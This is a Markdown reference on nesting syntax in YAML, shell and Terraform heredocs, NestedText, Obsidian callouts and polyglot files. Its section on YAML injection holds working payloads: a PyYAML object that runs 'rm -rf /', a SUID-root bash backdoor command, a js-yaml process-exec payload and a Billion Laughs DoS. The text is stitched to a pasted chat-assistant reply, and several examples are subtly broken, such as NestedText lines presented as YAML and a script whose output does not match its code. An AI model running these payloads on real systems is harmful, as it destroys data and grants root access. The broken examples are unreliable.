<!-- SPDX-License-Identifier: AGPL-3.0-or-later OR EUPL-1.2 -->
<!-- Copyright 2026 Saimonokuma. -->
# Nesting Indentation Variants — Full Reference

## 1. YAML Block Scalars (the "HEREDOC+" equivalents)

| Variant | Syntax | Newlines | Trailing |
|---------|--------|----------|----------|
| Literal + Clip | `|` | preserved | 1 newline |
| Literal + Strip | `|-` | preserved | none |
| Literal + Keep | `|+` | preserved | all |
| Folded + Clip | `>` | folded to space | 1 newline |
| Folded + Strip | `>-` | folded to space | none |
| Folded + Keep | `>+` | folded to space | all |

With **indentation indicators** (number after the indicator):

| Variant | Meaning |
|---------|---------|
| `\|2` | Body indent = 2 spaces (explicit) |
| `\|2+` | 2-space indent + keep trailing |
| `>1-` | 1-space indent + strip trailing |

```yaml
# All 6 base combinations
literal_clip: |
  line one
  line two

literal_strip: |-
  line one
  line two

literal_keep: |+
  line one
  line two

folded_clip: >
  line one
  line two

folded_strip: >-
  line one
  line two

folded_keep: >+
  line one
  line two

# With explicit indentation indicator
explicit: |2
  This Is A Header
  The body starts here
```

---

## 2. YAML Structural Nesting (Indentation-Based)

```yaml
# Nested maps (2-space indent)
a:
  b:
    c: value

# Nested sequences
list:
  - item1
  - item2

# Sequence inside sequence
seq:
  - - inner1
    - inner2
  - - - deep-sequence-ception

# Block scalar inside a sequence
items:
  - |
    multi-line
    literal here
  - >
    folded
    text here

# Block scalar nested inside a map inside a sequence
complex:
  - name: script
    body: |
      #!/bin/bash
      echo "hello"
```

**Rules:**
- Tabs are **forbidden** for indentation
- 2 spaces is convention (4 is legal if consistent)
- A less-indented line ends the current block

---

## 3. YAML Anchors, Aliases & Merge Keys (Nested Reuse)

```yaml
# Anchor + Alias
defaults: &defaults
  host: localhost
  port: 5432

prod:
  <<: *defaults        # merge key (shallow)
  host: prod.db        # overrides

# Multiple merges (leftmost wins)
merged:
  <<: [*base, *retry]
  custom: value
```

> **Gotcha:** merge is **shallow** — nested maps are replaced, not deep-merged.

---

## 4. Shell Heredoc Nesting Variants

| Variant | Syntax | Expansion | Indentation |
|---------|--------|-----------|-------------|
| Standard | `<<EOF` | yes | none (literal) |
| Quoted | `<<'EOF'` | **no** | none (literal) |
| Tab-stripped | `<<-EOF` | yes | leading **tabs** stripped |
| Tab-stripped + quoted | `<<-'EOF'` | **no** | leading tabs stripped |
| Here-string | `<<<"text"` | yes | N/A (single line) |

### Nested Heredocs (Bash)

```bash
# Outer uses <<-, inner uses <<- (both tab-indented)
ssh host1 <<-OUTER
  ssh host2 <<-INNER
    hostname
  INNER
OUTER
```

```bash
# Outer uses <<-, inner uses plain << (inner delimiter at column 0 after tab-strip)
bash <<-APACHE
    ...
    cat << MOD_REWRITE
        ...
    MOD_REWRITE
    ...
APACHE
```

```bash
# Different delimiters (simplest approach)
cat > output.sh << 'SCRIPT'
#!/bin/bash
cat << EOF
inner content
EOF
SCRIPT
```

**Key rules:**
- `<<-` strips **tabs only**, never spaces
- Each nested level needs a **unique delimiter**
- The closing delimiter must match exactly (or be tab-indented with `<<-`)

---

## 5. Terraform Heredoc Variants

```hcl
# Standard (preserves indentation)
user_data = <<EOT
#!/bin/bash
echo "no leading spaces"
EOT

# Indented (strips common leading whitespace)
user_data = <<-EOT
  #!/bin/bash
  echo "no leading spaces in output"
EOT

# Nested heredoc inside Terraform heredoc
user_data = <<-OUTER
  #!/bin/bash
  cat > /etc/config.conf << 'INNER'
  key=value
  INNER
OUTER
```

---

## 6. YAML Injection — Nested Attack Examples

### 6.1 Remote Code Execution (Python / PyYAML)

```yaml
# Executes: rm -rf /
!!python/object/apply:os.system
- 'rm -rf /'
```

```yaml
# Suid root backdoor
!!python/object/new:os.system ["cp `which bash` /tmp/bash;chown root /tmp/bash;chmod u+sx /tmp/bash"]
```

### 6.2 Ruby (Psych)

```yaml
# Arbitrary code execution via Ruby object instantiation
!ruby/object:MR::Shell
  command: "whoami"
```

### 6.3 js-yaml — `toString` Code Injection

```yaml
? !!js/function |
  function () { return this.constructor.constructor("return process")(); }
: !!js/function |
  function () { this.constructor.constructor("return process")().exec('id'); }
```

### 6.4 Billion Laughs (Nested Anchor/Alias DoS)

```yaml
lol1: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
lol2: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
lol3: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
lol4: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
lol5: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
# 9^5 = 59,049 strings from ~500 bytes
```

### 6.5 Deep Nesting DoS (Stack/Heap Exhaustion)

```yaml
a:
  a:
    a:
      a:
        # ... 10,000+ levels deep
        value: "x"
```

> CVE-2026-45133 (Symfony): `doParse()` and `parseBlock()` are mutually recursive — deeply nested blocks push frames until PHP fatal error.

### 6.6 Merge Key + Anchor Exploit (PyYAML < 5.4)

```yaml
# Bypass via merge key + nested object construction
!!python/object/apply:os.system
- 'id'
<<: *anchor
&anchor !!python/object/apply:os.system
- 'id'
```

### 6.7 Template/Config Injection (Rancher, Rails)

```yaml
# Rancher: newline-injection into image field
image: "evil\n  command: [\"/bin/sh\", \"-c\", \"malicious\"]"
```

```yaml
# Rails: arbitrary YAML via XML request → YAML.load
--- !ruby/object:ActiveRecord::Base
  @connection: ...
```

---

## 7. Summary Table — All Variants at a Glance

| Domain | Variant | Key Indicator |
|--------|---------|---------------|
| YAML | Literal block | `\|` |
| YAML | Literal strip | `\|-` |
| YAML | Literal keep | `\|+` |
| YAML | Folded block | `>` |
| YAML | Folded strip | `>-` |
| YAML | Folded keep | `>+` |
| YAML | Explicit indent | `\|N` / `>N` |
| YAML | Nested map | indent +2 |
| YAML | Nested seq | `-` |
| YAML | Seq-in-seq | `- -` |
| YAML | Merge key | `<<: *alias` |
| YAML | Anchor/Alias | `&name` / `*name` |
| Shell | Standard heredoc | `<<EOF` |
| Shell | Quoted heredoc | `<<'EOF'` |
| Shell | Tab-stripped | `<<-EOF` |
| Shell | Nested heredoc | unique delimiters |
| Shell | Here-string | `<<<` |
| Terraform | Standard | `<<EOT` |
| Terraform | Indented | `<<-EOT` |
| Terraform | Nested | different delimiters |
| Injection | PyYAML RCE | `!!python/object/apply` |
| Injection | Psych RCE | `!ruby/object` |
| Injection | js-yaml | `!!js/function` |
| Injection | Billion Laughs | nested `&`/`*` |
| Injection | Deep nest DoS | recursive indent |
| Injection | Merge bypass | `<<` + `&` |
| Injection | Template newline | `\n` in string |

##Here's the full enriched `.md` document. Note: **`[!ALARM]` is not a built-in Obsidian type** — the closest built-ins are `[!warning]`, `[!danger]`, and `[!caution]`. Custom types like `[!alarm]` require CSS snippets.

---

```markdown
# Nesting Indentation — Complete Reference (Enriched)

## 8. NestedText (.nt) — Full Variant List

> **Source:** [nestedtext.org](https://nestedtext.org) — a safe, human-readable data format.
> Only three data types: **dictionaries**, **lists**, **strings**. No implicit typing. No code execution risk.

### 8.1 Core Syntax Tags

| Tag | Meaning | Example |
|-----|---------|---------|
| `key: value` | Dictionary item (rest-of-line string) | `name: Alice` |
| `key:` | Dictionary item with nested value | `address:` → indented dict/list/string |
| `- value` | List item (rest-of-line string) | `- apple` |
| `-` | List item with nested value | `-` → indented dict/list/string |
| `> text` | Multiline string line | `> line one` |
| `>` (alone) | Empty line within multiline string | `>` |
| `# comment` | Comment (ignored) | `# this is a note` |

### 8.2 NestedText Nesting Variants

```nt
# Dictionary inside dictionary (indentation)
server:
  host: localhost
  port: 8080
  database:
    engine: postgres
    credentials:
      user: admin
      password: secret

# List inside dictionary
tags:
  - alpha
  - beta
  - gamma

# Dictionary inside list
servers:
  - name: web-1
    ip: 10.0.0.1
  - name: db-1
    ip: 10.0.0.2

# Multiline string inside dictionary
description:
  > This is a multiline string.
  > The second line is indented in the source
  >   but the leading space after > is stripped.
  >
  > This is a blank line in the string.

# Multiline string inside list
- > first item line 1
  > first item line 2
- > second item line 1

# Deep nesting (arbitrary depth)
a:
  b:
    c:
      d:
        e: deepest value
```

### 8.3 NestedText vs. YAML — Key Differences

| Feature | NestedText | YAML |
|---------|-----------|------|
| Types | dict, list, string **only** | 15+ types (int, float, bool, null, date, …) |
| Implicit typing | **None** — everything is a string | Yes (auto-converts `true`, `123`, `null`, etc.) |
| Code execution risk | **None** | Yes (`!!python/object/apply`, etc.) |
| Quoting | Never needed | Sometimes required |
| Multiline string tag | `>` | `\|` or `>` |
| List tag | `-` | `-` |
| Comment | `#` | `#` |
| Tab indentation | Forbidden | Forbidden |
| Explicit indent indicator | N/A | `\|2`, `>3`, etc. |
| Anchors / aliases | **Not supported** | `&anchor` / `*alias` |
| Merge keys | **Not supported** | `<<: *alias` |

### 8.4 NestedText Multiline String — All Edge Cases

```nt
# Basic
key:
  > line one
  > line two

# Preserved leading whitespace (space after > is the tag delimiter)
key:
  >     indented line
  > normal line

# Blank line within string
key:
  > first
  >
  > second

# String that looks like a key (safe — no ambiguity)
key:
  > name: not-a-dict-item

# String that looks like a list item
key:
  > - not-a-list-item

# Inline string (rest-of-line)
key: simple value with : colon and - dash and > angle
```

---

## 9. Obsidian / GitHub Callout (Admonition) Types

### 9.1 All Built-in Types

| Type | Aliases | Color | Icon |
|------|---------|-------|------|
| `[!note]` | — | blue | ℹ️ |
| `[!abstract]` | `summary`, `tldr` | green | 📄 |
| `[!info]` | — | blue | ℹ️ |
| `[!todo]` | — | blue | ✅ |
| `[!tip]` | `hint`, `important` | sky blue | 💡 |
| `[!success]` | `check`, `done` | green | ✔️ |
| `[!question]` | `help`, `faq` | yellow | ❓ |
| `[!warning]` | `caution`, `attention` | orange | ⚠️ |
| `[!failure]` | `fail`, `missing` | red | ❌ |
| `[!danger]` | `error` | red | ⛔ |
| `[!bug]` | — | red | 🐛 |
| `[!example]` | — | purple | 💻 |
| `[!quote]` | `cite` | grey | 💬 |

> ⚠️ **`[!ALARM]` is NOT a built-in type.** Use `[!danger]` or `[!warning]` instead, or define a custom `[!alarm]` via CSS snippet.

### 9.2 Callout Syntax Variants

```markdown
> [!note]
> Basic callout.

> [!warning] Custom Title
> Callout with a custom title.

> [!tip]+ Open by default (collapsible)
> Click to collapse.

> [!danger]- Closed by default (collapsible)
> Click to expand.

> [!example]
> Nested content:
>
> - item 1
> - item 2
>
> ```python
> print("code inside callout")
> ```
```

### 9.3 GitHub Alerts (5 types only)

```markdown
> [!NOTE]
> Blue informational note.

> [!TIP]
> Green helpful tip.

> [!IMPORTANT]
> Purple important info.

> [!WARNING]
> Orange warning.

> [!CAUTION]
> Red dangerous action.
```

### 9.4 Custom Callout (CSS Snippet)

```css
/* Define [!alarm] as a custom type */
.callout[data-callout="alarm"] {
  --callout-color: 255, 0, 0;
  --callout-icon: lucide-alarm;
}
```

```markdown
> [!alarm] Custom Alarm
> This renders with a red alarm icon (requires CSS snippet).
```

---

## 10. Polyglot Forms — Where Formats Overlap

A **polyglot** is a single file valid in two or more formats simultaneously.

### 10.1 Markdown + YAML (Frontmatter)

The most common polyglot in practice. A `.md` file is **Markdown** to a renderer and **YAML** to a frontmatter parser:

```markdown
---
title: My Document
tags:
  - yaml
  - markdown
  - polyglot
date: 2026-09-02
description:
  > This is a YAML block scalar
  > that is also part of a Markdown file
---

# Heading

> [!note]
> This callout is **Markdown** to Obsidian,
> but a **YAML block scalar** to a YAML parser
> that sees the whole file.
```

### 10.2 YAML Block Scalar Containing NestedText

A YAML `|` or `>` block scalar can hold **valid NestedText** as an opaque string:

```yaml
# YAML file that embeds NestedText
config:
  schema:
    > server:
    >   host: localhost
    >   port: 8080
    > tags:
    >   - production
    >   - eu-west
```

Parsed by YAML → `config.schema` is a **string** containing NestedText.
Parsed by NestedText (if extracted) → a valid `.nt` structure.

### 10.3 NestedText Multiline String Containing YAML

```nt
# NestedText file that embeds YAML
deploy:
  manifest:
    > apiVersion: apps/v1
    > kind: Deployment
    > metadata:
    >   name: my-app
    > spec:
    >   replicas: 3
```

Parsed by NestedText → `deploy.manifest` is a **string** containing YAML.
Parsed by YAML (if extracted) → a valid Kubernetes manifest.

### 10.4 Shell Heredoc → YAML → NestedText (Triple Polyglot)

```bash
#!/bin/bash
# Outer: Bash heredoc
# Middle: YAML
# Inner: NestedText (as a YAML block scalar)

cat > output.yaml << 'YAMLEOF'
---
app:
  name: my-service
  schema:
    > server:
    >   host: localhost
    >   port: 8080
    > endpoints:
    >   - /health
    >   - /metrics
YAMLEOF

echo "Wrote output.yaml"
```

**Three parsers, three valid interpretations:**

| Parser | Sees | Result |
|--------|------|--------|
| Bash | heredoc `<< 'YAMLEOF'` | writes file to `output.yaml` |
| YAML | `---` document | `app.schema` is a multiline string |
| NestedText | (extracted string) | valid `.nt` dict with `server` + `endpoints` |

### 10.5 Obsidian Callout Inside YAML Block Scalar

```yaml
# YAML file
docs:
  readme: |
    > [!warning]
    > This YAML block scalar contains
    > an Obsidian callout.
    >
    > [!danger]
    > If rendered in Obsidian, these
    > callouts will appear as styled boxes.
```

- **YAML parser:** `docs.readme` = a string
- **Obsidian (if the string is rendered as Markdown):** two styled callout boxes

### 10.6 Markdown Callout That Looks Like NestedText

```markdown
> [!example]
> This callout body is also valid NestedText:
>
> ```nt
> key: value
> list:
>   - a
>   - b
> nested:
>   > multiline
>   > string
> ```
```

- **Obsidian:** renders as a purple callout with a code block
- **NestedText parser (on the code block content):** valid `.nt`

### 10.7 JSON ⊂ YAML (JSON is Valid YAML)

```json
{
  "name": "test",
  "tags": ["a", "b"],
  "nested": {
    "key": "value"
  }
}
```

This is simultaneously:
- Valid **JSON** (strict)
- Valid **YAML** (flow style)
- **Not** valid NestedText (no `{}` or `[]` syntax)

### 10.8 TOML ≈ YAML (Partial Overlap)

```toml
# TOML
[server]
host = "localhost"
port = 8080

[server.database]
engine = "postgres"
```

```yaml
# Equivalent YAML
server:
  host: localhost
  port: 8080
  database:
    engine: postgres
```

> TOML is **not** valid YAML (bracketed sections `[server]` are not YAML syntax), but the **data model** maps 1:1.

### 10.9 Full-Stack Polyglot (Bash → YAML → NestedText → Markdown Callout)

```bash
#!/bin/bash
# LEVEL 1: Bash heredoc
cat > report.md << 'MDEOF'
---
title: Auto-generated Report
level: 2
MDEOF

# LEVEL 2: Append YAML frontmatter is already written
# LEVEL 3: Append Markdown body with callout
cat >> report.md << 'BODY'

> [!success]
> Build completed.
>
> [!example]
> Config:
>
> ```nt
> server:
>   host: localhost
>   port: 8080
>   status:
>     > healthy
>     > uptime: 99.97%
> ```
BODY

echo "report.md written"
```

**Resulting `report.md`:**

```markdown
---
title: Auto-generated Report
level: 2
---

> [!success]
> Build completed.
>
> [!example]
> Config:
>
> ```nt
> server:
>   host: localhost
>   port: 8080
>   status:
>     > healthy
>     > uptime: 99.97%
> ```
```

**Four valid interpretations of the same file:**

| Parser | Interpretation |
|--------|---------------|
| **Bash** | Two heredocs writing to a file |
| **YAML** (frontmatter) | `{title: "Auto-generated Report", level: 2}` |
| **Markdown / Obsidian** | A page with two callouts and a code block |
| **NestedText** (code block) | `{server: {host: "localhost", port: "8080", status: "healthy\nuptime: 99.97%"}}` |

---

## 11. Master Summary — All Variants (Updated)

| Domain | Variant | Key Indicator | Polyglot With |
|--------|---------|---------------|---------------|
| **YAML** | Literal block | `\|` | MD, NT, Heredoc |
| **YAML** | Literal strip | `\|-` | MD, NT, Heredoc |
| **YAML** | Literal keep | `\|+` | MD, NT, Heredoc |
| **YAML** | Folded block | `>` | MD, NT, Heredoc |
| **YAML** | Folded strip | `>-` | MD, NT, Heredoc |
| **YAML** | Folded keep | `>+` | MD, NT, Heredoc |
| **YAML** | Explicit indent | `\|N` / `>N` | — |
| **YAML** | Nested map | indent +2 | NT, TOML |
| **YAML** | Nested seq | `-` | NT, JSON |
| **YAML** | Merge key | `<<: *alias` | — |
| **YAML** | Anchor/Alias | `&` / `*` | — |
| **NestedText** | Dict item | `key: value` | YAML |
| **NestedText** | List item | `- value` | YAML |
| **NestedText** | Multiline string | `> text` | YAML `\|`, MD blockquote |
| **NestedText** | Comment | `#` | YAML, Shell, TOML |
| **NestedText** | Nested dict | indent | YAML |
| **NestedText** | Nested list | indent + `-` | YAML |
| **Shell** | Heredoc | `<<EOF` | YAML, NT, MD |
| **Shell** | Quoted heredoc | `<<'EOF'` | YAML, NT, MD |
| **Shell** | Tab-stripped | `<<-EOF` | YAML, NT, MD |
| **Shell** | Nested heredoc | unique delimiters | — |
| **Terraform** | Standard | `<<EOT` | YAML, NT |
| **Terraform** | Indented | `<<-EOT` | YAML, NT |
| **Obsidian** | Callout | `> [!type]` | MD blockquote, YAML `\|` |
| **Obsidian** | Collapsible open | `> [!type]+` | — |
| **Obsidian** | Collapsible closed | `> [!type]-` | — |
| **Obsidian** | Custom type | `> [!alarm]` + CSS | — |
| **GitHub** | Alert | `> [!NOTE]` | MD blockquote |
| **JSON** | Flow mapping | `{...}` | YAML |
| **TOML** | Section | `[key]` | YAML (data model) |
| **Injection** | PyYAML RCE | `!!python/object/apply` | — |
| **Injection** | Psych RCE | `!ruby/object` | — |
| **Injection** | js-yaml | `!!js/function` | — |
| **Injection** | Billion Laughs | nested `&`/`*` | — |
| **Injection** | Deep nest DoS | recursive indent | NT (safe — no recursion) |
| **Injection** | Merge bypass | `<<` + `&` | — |
| **Injection** | Template newline | `\n` in string | — |
| **Polyglot** | MD + YAML frontmatter | `---` | MD, YAML |
| **Polyglot** | YAML `\|` + NT | block scalar | YAML, NT |
| **Polyglot** | NT `>` + YAML | multiline string | NT, YAML |
| **Polyglot** | Bash → YAML → NT | heredoc | Bash, YAML, NT |
| **Polyglot** | MD callout + NT code block | `> [!example]` | MD, NT |
| **Polyglot** | JSON ⊂ YAML | flow style | JSON, YAML |
| **Polyglot** | Full-stack (4 layers) | Bash + MD + YAML + NT | Bash, MD, YAML, NT |
```

---

### Key Takeaway

**NestedText is the "safe" counterpart to YAML** — same indentation-based nesting philosophy, but with zero implicit typing and zero code execution surface. Its `>` multiline string tag is the closest analogue to YAML's `|` literal block scalar. The polyglot combinations above show that a single file can be simultaneously valid as **Bash**, **Markdown**, **YAML**, and **NestedText** — each parser reading a different layer.

